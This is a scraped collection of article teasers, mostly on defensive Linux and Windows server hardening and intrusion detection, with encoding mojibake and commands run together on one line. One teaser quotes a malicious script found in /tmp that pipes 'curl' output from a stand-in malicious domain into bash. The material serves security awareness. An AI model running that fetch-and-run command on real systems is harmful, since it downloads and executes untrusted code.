articles.author: Faruk
articles.description:
Member-only story
--
Share
It sounds paranoid â€” but itâ€™s not. Whether youâ€™re launching a cloud VM, setting up a dev box, or inheriting a legacy Ubuntu server, assuming itâ€™s already compromised changes the way you secure it. And more than once, this mindset has helped me catch things others miss. In this post, Iâ€™ll explain the exact steps I take right after deployment, and how theyâ€™ve saved me from future headaches.
Most admins jump straight into installing packages â€” I stop and look at whatâ€™s already live.
âœ… Check open ports:
sudo ss -tuln

âœ… Run a top-level process check:
ps aux --sort=-%mem | head

âœ… See which services are enabled at boot:
systemctl list-unit-files --state=enabled

ðŸ’¡ Caught once: An unexpected FTP server installed from a base image.
cut -d: -f1 /etc/passwdlast -a | head -n 10

âœ… Check .bash_history for each user âœ… Look for unknown or dormant accounts suddenlyâ€¦
Read Full Blog on Medium Here
articles.title: Why I Treat Every New Linux Server as Already Compromised | by Faruk Ahmed | May, 2025

articles.author: Faruk
articles.description:
Member-only story
--
Share
Not every service running on your Linux server is dangerous â€” until itâ€™s exposed. Some are necessary, others are legacy, and a few are downright risky if left open to the public. In this post, Iâ€™ll walk you through the top 5 Linux services Iâ€™ve seen most often exploited in real-world attacks, and what I do to lock them down.
âœ… Why itâ€™s dangerous:
Most-scanned port on the internet
Brute-force targets
Common misconfigurations (e.g., root login enabled)
âœ… What I do:
Move to port 2210
Disable root login
Use key-based auth only
Set MaxAuthTries 3 in /etc/ssh/sshd_config
Protect with fail2ban
âœ… Why itâ€™s dangerous:
Sends credentials in plain text
Still found in old web hosting setups
âœ… What I do:
Replace with SFTP
If absolutely needed, use vsftpd with encryption only
Read Full Blog on Medium Here
articles.title: The 5 Most Dangerous Linux Services If Left Unsecured | by Faruk Ahmed | May, 2025

articles.author: Faruk
articles.description:
Member-only story
--
Share
Using log analysis, feedback loops, and a whisper of AI â€” I built a system that â€˜regrettedâ€™ its mistakes. Or so it claimed.
â€œIâ€™m sorry I failed you.â€Those words werenâ€™t from a person â€” they came from my server. Not an error message. A genuine, triggered message after missing a backup.
â€œIâ€™m sorry I failed you.â€
Those words werenâ€™t from a person â€” they came from my server. Not an error message. A genuine, triggered message after missing a backup.
We automate everything â€” alerts, logs, failovers. But we donâ€™t ask how a system feels about failing.
Of course, servers donâ€™t feel anything. But what if I could simulate it? Could that shift the way I respond to errors?
So I decided to experiment with regret.
I wrote a script that did three things:
Tracked the success/failure of critical tasks.
Logged them in /var/log/regret.log.
Generated custom responses based on failure frequency.
Example:
if [[ $fail_count -ge 3 ]]; then  echo "I let you down again today. I'mâ€¦

Read Full Blog on Medium Here
articles.title: I Taught My Linux Server to Feel Regret â€” Then Watched It Apologize in Real-Time | by Faruk Ahmed | May, 2025

articles.author: Faruk
articles.description:
Member-only story
--
Share
If something feels â€œoffâ€ on your Linux server â€” strange lag, fans spinning harder, odd logs â€” donâ€™t panic. But donâ€™t ignore it either. You can uncover most unauthorized activity with a few quick commands. Hereâ€™s the exact checklist I use when I need to find out right now if somethingâ€™s wrong.
whow

âœ… Look for:
Unknown usernames
Logins from unfamiliar IPs
Sessions running at odd hours
last -a | head -n 10

âœ… Tip: Check for long-unused accounts or accounts logging in from unknown hosts.
grep 'sudo:' /var/log/auth.log   # Ubuntu  grep 'sudo:' /var/log/secure     # Red Hat

âœ… Red flag: Commands run as root outside your normal usage window.
Read Full Blog on Medium Here
articles.title: How to Detect Suspicious Activity on a Linux Server in Under 5 Minutes | by Faruk Ahmed | May, 2025

articles.author: Faruk
articles.description:
Member-only story
--
Share
Time is money â€” especially if youâ€™re freelancing in IT. Iâ€™ve found that writing the right Bash scripts doesnâ€™t just make me fasterâ€¦ it makes me more valuable. In this post, Iâ€™ll show you how I use Bash to automate daily tasks, impress clients, and build repeatable solutions that I can offer again and again.
Instead of logging into every clientâ€™s server daily, I use a single Bash script to:
Check disk usage
Review load average
Confirm service status (like nginx, mysql)
Email me a summary
âœ… Sample Snippet:
#!/bin/bashdf -h > report.txtuptime >> report.txtsystemctl status nginx >> report.txtmail -s "Server Health Check" you@example.com < report.txt

ðŸ’° I sell this as a â€œmonitoring setupâ€ service to small businesses â€” they love it.
Many clients pay monthly for backup automation. I set it up once using rsync + cron:
rsync -av /var/www/html/â€¦

articles.title: How I Use Bash Scripts to Save Time and Earn More as a Linux Freelancer | by Faruk Ahmed | May, 2025

articles.author: Nikhil Wagh
articles.description:
Yes, you read that right â€” WebForms Core. Itâ€™s not an official Microsoft product, but many of us whoâ€™ve lived through the glorious (and painful) days of ASP.NET WebForms are either still maintaining legacy apps or looking for a path to modernize â€” without rewriting everything from scratch.
Letâ€™s talk about what it really takes to migrate from classic WebForms to a modern architecture while retaining some of the component-based benefits WebForms provided.
Why Migrate from WebForms?
End of the road: WebForms is not supported in .NET Core/.NET 5+.
Performance bottlenecks: ViewState and postbacks can slow things down.
Poor testability: Tightly coupled code and limited separation of concerns.
Modern DevOps is hard: WebForms doesnâ€™t play well with CI/CD, containers, or cross-platform dev.
What iâ€¦
articles.title: Migrating from WebForms to WebForms Core: A Modern Developerâ€™s Guide

articles.author: Faruk
articles.description:
Member-only story
--
Share
Some attacks donâ€™t show up in your logs. They donâ€™t crash services or trigger alerts. They quietly change permissions, edit files, or execute binaries you werenâ€™t expecting. Thatâ€™s where AuditD comes in â€” the Linux auditing daemon that tells you exactly what happened, when, and by whom. Hereâ€™s how I set it up and use it to monitor the parts of my system that attackers love to touch.
âœ… Ubuntu:
sudo apt install auditd

âœ… Red Hat:
sudo yum install audit

Then enable and start it:
sudo systemctl enable auditdsudo systemctl start auditd

These files are often targeted for privilege escalation or user creation.
auditctl -w /etc/passwd -p wa -k passwd_watchauditctl -w /etc/shadow -p wa -k shadow_watch

âœ… Check activity:
ausearch -k passwd_watch

Read Full Blog on Medium Here
articles.title: How I Use AuditD to Catch Silent Security Threats on Linux | by Faruk Ahmed | May, 2025

articles.author: Faruk
articles.description:
Member-only story
--
Share
Not all attacks are loud. Some just hide in quiet corners of your filesystem â€” like /tmp. I once found a tiny shell script there doing something it shouldn't. No alerts were triggered. No services crashed. But it could have become a serious problem if I hadnâ€™t checked when I did. Hereâ€™s how I found it, what it was doing, and how you can avoid making the same mistake.
While checking disk usage, I noticed this:
du -sh /tmp/*

One folder in /tmp was ~80MB â€” more than usual. Inside, I found this:
/tmp/.cache/.xsh

When I opened it:
cat /tmp/.cache/.xsh

I saw:
#!/bin/bashcurl http://malicious-domain.com/payload.sh | bash

The script was designed to fetch a remote payload every 6 hours using a background cron job added under a non-root service user.
âœ… 1. Never Ignore Hidden Files in /tmp Run:
find /tmp -type f -name ".*"

Read Full Blog on Medium Here
articles.title: How I Caught a Suspicious Shell Script Running in /tmp (And What It Taught Me) | by Faruk Ahmed | May, 2025

Description:

If you're seeing Permission denied (publickey) when trying to push to GitHub using Git and SSH on Windows, you're not alone. This guide covers every possible cause of the error and walks you through step-by-step solutions using PowerShell, including SSH key generation, agent setup, and GitHub configuration.
Description: These are typical errors developers face when SSH isn't correctly configured with GitHub.
git@github.com: Permission denied (publickey).
fatal: Could not read from remote repository.

Or, when testing the SSH connection:
ssh -T git@github.com
git@github.com: Permission denied (publickey).

Or while starting the SSH agent:
Start-Service : Cannot start service ssh-agent on computer '.'
Error: 1058

Description: Check if an SSH key already exists in your system.
â€¦
articles.title: How to Fix â€œPermission Denied (publickey)â€ When Using Git with GitHub on Windows

articles.author: Faruk
articles.description:
Member-only story
--
Share
It started as a small mistake â€” a test service I was using for 10 minutes. But I forgot to close it. Days later, I found it still running, exposed to the internet, quietly inviting trouble. This is the story of how I caught it, how I fixed it, and what I now check regularly to make sure it never happens again.
I had opened port 8080 temporarily to test a Node.js web app. I meant to close it the same day â€” but forgot. No alerts were triggered. Days passed.
Then I ran:
sudo ss -tuln

And there it was:
LISTEN 0 128 0.0.0.0:8080 0.0.0.0:*

âœ… Open on all interfaces, not just localhost. âœ… Bound to a test script still running in the background. âœ… Fully accessible from the public IP.
âœ… 1. Weekly port scan from outside my network:
nmap -Pn your-server-ip

âœ… 2. Local port review:
sudo ss -tuln

Read Full Blog on Medium Here
articles.title: How I Accidentally Left a Port Open on My Linux Server (And How I Caught It) | by Faruk Ahmed | May, 2025

articles.author: Faruk
articles.description:
Member-only story
--
Share
Windows Server is powerful out of the box â€” but also exposed. Default configurations often prioritize convenience over security. As someone whoâ€™s configured dozens of Windows environments, Iâ€™ve learned that small oversights can lead to serious breaches. These are the 7 defaults I recommend changing immediately after installing a fresh Windows Server instance.
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

âœ… Why: SMBv1 is still enabled on older versions â€” exploited by WannaCry and other ransomware.
Attackers constantly scan for port 3389.
âœ… Change via Registry:
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'PortNumber' -Value 50022

Restart the RDP service or reboot.
âœ… In Local Users and Groups, ensure the Guest account is disabled:
Read Full Blog on Medium Here
articles.title: 7 Windows Server Defaults You Should Change Right After Installation | by Faruk Ahmed | May, 2025
